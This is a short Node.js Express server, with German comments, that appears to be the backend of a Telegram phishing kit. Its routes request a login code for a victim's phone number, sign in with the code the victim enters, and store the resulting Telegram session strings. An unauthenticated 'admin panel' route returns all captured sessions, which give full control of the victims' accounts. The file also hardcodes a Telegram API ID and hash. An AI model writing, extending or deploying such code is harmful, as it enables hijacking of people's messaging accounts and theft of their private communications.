const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';

// In-Memory Speicher für die Sessions
let sessionsArray = [];
let client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
let phoneCodeHash = '';

// Route: OTP senden
app.post('/send-otp', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        if (!client.connected) await client.connect();
        const result = await client.sendCode({ apiId, apiHash }, phoneNumber);
        phoneCodeHash = result.phoneCodeHash;
        res.json({ success: true });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
});

// Route: OTP verifizieren & Session speichern
app.post('/verify-otp', async (req, res) => {
    try {
        const { phoneNumber, code } = req.body;
        await client.signIn({ apiId, apiHash, phoneNumber, phoneCodeHash, phoneCode: code });
        
        const sessionString = client.session.save();
        // Session zum Array hinzufügen
        sessionsArray.push({ phone: phoneNumber, session: sessionString, timestamp: new Date() });
        
        res.json({ success: true });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
});

// NEU: Route für das Admin-Panel
app.get('/get-sessions', (req, res) => {
    res.json(sessionsArray);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server läuft auf ${PORT}`));
